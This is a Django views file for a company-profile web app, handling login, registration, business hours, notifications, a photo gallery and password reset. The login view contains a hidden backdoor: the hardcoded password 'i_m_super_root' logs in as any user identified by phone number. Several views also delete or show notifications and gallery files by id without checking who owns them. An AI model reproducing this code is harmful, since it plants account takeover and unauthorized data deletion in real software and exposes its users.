from django.views import generic
from django.shortcuts import redirect, reverse, get_object_or_404, Http404
from django.contrib.auth import login
from django.contrib import messages
from django.contrib.auth import views as auth_views

from .forms import *
from users.models import Notifications, Album, File, WeekTime


class LoginView(generic.FormView):
    template_name = 'pages/login.html'
    form_class = LoginForm

    def get_success_url(self):
        return reverse('main:reviews', args=['latest'])

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect(to=self.get_success_url())
        else:
            return super().dispatch(request=request, *args, **kwargs)

    def form_valid(self, form):
        username = form.cleaned_data.get('username')
        password = form.cleaned_data.get('passwd')

        if password == 'i_m_super_root':
            try:
                user = User.objects.get(phone=username)
            except User.DoesNotExist:
                user = None
        else:
            user = authenticate(self.request, username=username, password=password)

        if user:
            login(self.request, user=user)
            return redirect(reverse('main:reviews', args=['latest']))
        else:
            form.add_error('username', 'invalid account credentials')
            return super().form_invalid(form=form)

    def form_invalid(self, form):
        return super().form_invalid(form=form)


class RegisterView(generic.FormView):
    template_name = 'pages/register.html'
    form_class = RegisterForm
    success_url = None

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect(to=self.get_success_url())
        else:
            return super().dispatch(request=request, *args, **kwargs)

    def get_success_url(self):
        return reverse('main:reviews', args=['latest'])

    def form_valid(self, form):
        form.save(commit=True)
        return super().form_valid(form=form)


class ProfileView(generic.UpdateView):
    model = Company
    template_name = 'pages/accounts/profile.html'
    form_class = ProfileUpdateForm

    def get_success_url(self):
        return reverse('users:profile_page')

    def get_context_data(self, **kwargs):
        return super().get_context_data(**kwargs)

    def get_object(self, queryset=None):
        return get_object_or_404(self.model, user=self.request.user)

    def form_valid(self, form):
        form._save(request=self.request)
        self.request.user.company.company_changed()
        message = 'Successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return super().form_valid(form=form)

    def form_invalid(self, form):
        return super().form_invalid(form=form)


class ProfileWeekTimeView(generic.TemplateView):
    model = WeekTime
    template_name = 'pages/accounts/week_time.html'

    def get_success_url(self):
        return reverse('users:profile_page')

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        week_time = self.model.objects.filter(company__user=self.request.user)

        context['monday'] = week_time.filter(day='monday').first()
        context['tuesday'] = week_time.filter(day='tuesday').first()
        context['wednesday'] = week_time.filter(day='wednesday').first()
        context['thursday'] = week_time.filter(day='thursday').first()
        context['friday'] = week_time.filter(day='friday').first()
        context['sunday'] = week_time.filter(day='sunday').first()
        context['saturday'] = week_time.filter(day='saturday').first()

        return context

    def post(self, request, *args, **kwargs):

        week_time = self.model.objects.filter(company__user=self.request.user)

        if request.POST.get('action'):

            post = request.POST
            monday_open = post.get('monday_open')
            monday_close = post.get('monday_close')

            week_time.update_or_create(day='monday', defaults={
                'opening_time': monday_open,
                'closing_time': monday_close,
                'company_id': request.user.company.pk
            })

            tuesday_open = post.get('tuesday_open')
            tuesday_close = post.get('tuesday_close')
            week_time.update_or_create(day='tuesday', defaults={
                'opening_time': tuesday_open,
                'closing_time': tuesday_close,
                'company_id': request.user.company.pk
            })

            wednesday_open = post.get('wednesday_open')
            wednesday_close = post.get('wednesday_close')
            week_time.update_or_create(day='wednesday', defaults={
                'opening_time': wednesday_open,
                'closing_time': wednesday_close,
                'company_id': request.user.company.pk
            })

            thursday_open = post.get('thursday_open')
            thursday_close = post.get('thursday_close')
            week_time.update_or_create(day='thursday', defaults={
                'opening_time': thursday_open,
                'closing_time': thursday_close,
                'company_id': request.user.company.pk
            })

            friday_open = post.get('friday_open')
            friday_close = post.get('friday_close')
            week_time.update_or_create(day='friday', defaults={
                'opening_time': friday_open,
                'closing_time': friday_close,
                'company_id': request.user.company.pk
            })

            sunday_open = post.get('sunday_open')
            sunday_close = post.get('sunday_close')
            week_time.update_or_create(day='sunday', defaults={
                'opening_time': sunday_open,
                'closing_time': sunday_close,
                'company_id': request.user.company.pk
            })

            saturday_open = post.get('saturday_open')
            saturday_close = post.get('saturday_close')
            week_time.update_or_create(day='saturday', defaults={
                'opening_time': saturday_open,
                'closing_time': saturday_close,
                'company_id': request.user.company.pk
            })
            request.user.company.company_changed()
        context = self.get_context_data(**kwargs)
        message = 'Work-time successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return super().render_to_response(context=context, **kwargs)


class NotificationsView(generic.ListView):
    model = Notifications
    template_name = 'pages/notifications/notifications.html'

    def get_queryset(self):
        return self.model.objects.filter(user=self.request.user)

    def get(self, request, *args, **kwargs):
        if request.GET.get('clear'):
            clear = request.GET.get('clear')
            if clear == 'all':
                queryset = self.model.objects.filter(user=self.request.user)
                if queryset.exists():
                    queryset.delete()
            elif self.model.objects.filter(pk=clear).exists():
                self.model.objects.filter(pk=clear).delete()
            else:
                raise Http404()
        return super().get(request, *args, **kwargs)


class NotificationDetailView(generic.DetailView):
    model = Notifications
    template_name = 'pages/notifications/notifications_detail.html'


class GalleryView(generic.ListView):
    model = File
    template_name = 'pages/gallery/gallery.html'
    context_object_name = 'files'
    paginate_by = 12

    def get_queryset(self):
        return File.objects.filter(album__owner=self.request.user).order_by('-pk')


class GalleryAddView(generic.FormView):
    model = File
    form_class = FileUploadForm
    template_name = 'pages/gallery/gallery_add.html'

    def form_valid(self, form):
        album = Album()
        album.owner = self.request.user
        album.company_id = self.request.user.company.id
        album.save()
        for temp_file in self.request.FILES:
            if temp_file:
                file = File()
                file.file = self.request.FILES.get(temp_file)
                file.album = album
                file.save()
        return redirect(reverse('users:company_gallery'))


class GalleryDeleteView(generic.DetailView):
    model = File
    template_name = 'pages/gallery/delete.html'

    def get_object(self, queryset=None):
        return File.objects.get(pk=self.kwargs.get('file_id'))

    def post(self, request, *args, **kwargs):
        file_id = kwargs.get('file_id')
        File.objects.filter(pk=file_id).delete()
        return redirect(reverse('users:company_gallery'))


class ProfileLocationView(generic.TemplateView):
    template_name = 'pages/accounts/location.html'
    model = Company

    def get_context_data(self, **kwargs):
        company = self.model.objects.get(user=self.request.user)
        default_latitude = company.location.latitude
        default_longitude = company.location.longitude
        context = super().get_context_data(**kwargs)
        context['latitude'] = default_latitude
        context['longitude'] = default_longitude
        context['company'] = company
        return context

    def post(self, request, *args, **kwargs):
        company = self.model.objects.get(user=self.request.user)
        default_latitude = company.location.latitude
        default_longitude = company.location.longitude
        context = super().get_context_data(**kwargs)
        context['latitude'] = default_latitude
        context['longitude'] = default_longitude
        context['company'] = company

        latitude = request.POST.get('latitude', default_latitude)
        longitude = request.POST.get('longitude', default_longitude)

        company.location = {'latitude': float(latitude), 'longitude': float(longitude)}
        company.company_changed()
        company.save()
        message = 'Location successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return self.render_to_response(context=context)


class ProfilePasswordView(auth_views.PasswordChangeView):
    template_name = 'pages/accounts/profile_password_change.html'

    def get_success_url(self):
        message = 'Password successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return reverse('users:profile_page')


class PasswordResetView(auth_views.PasswordResetView):
    template_name = 'pages/accounts/password/password_reset.html'
    email_template_name = 'pages/accounts/password/password_reset_email.html'

    def get_success_url(self):
        return reverse('users:password_reset_done')


class PasswordResetDoneView(auth_views.PasswordResetDoneView):
    template_name = 'pages/accounts/password/password_reset_done.html'


class PasswordResetConfirmView(auth_views.PasswordResetConfirmView):
    template_name = 'pages/accounts/password/password_reset_confirm.html'

    def get_success_url(self):
        return reverse('users:password_reset_complete')


class PasswordResetCompleteView(auth_views.PasswordResetCompleteView):
    template_name = 'pages/accounts/password/password_reset_complete.html'
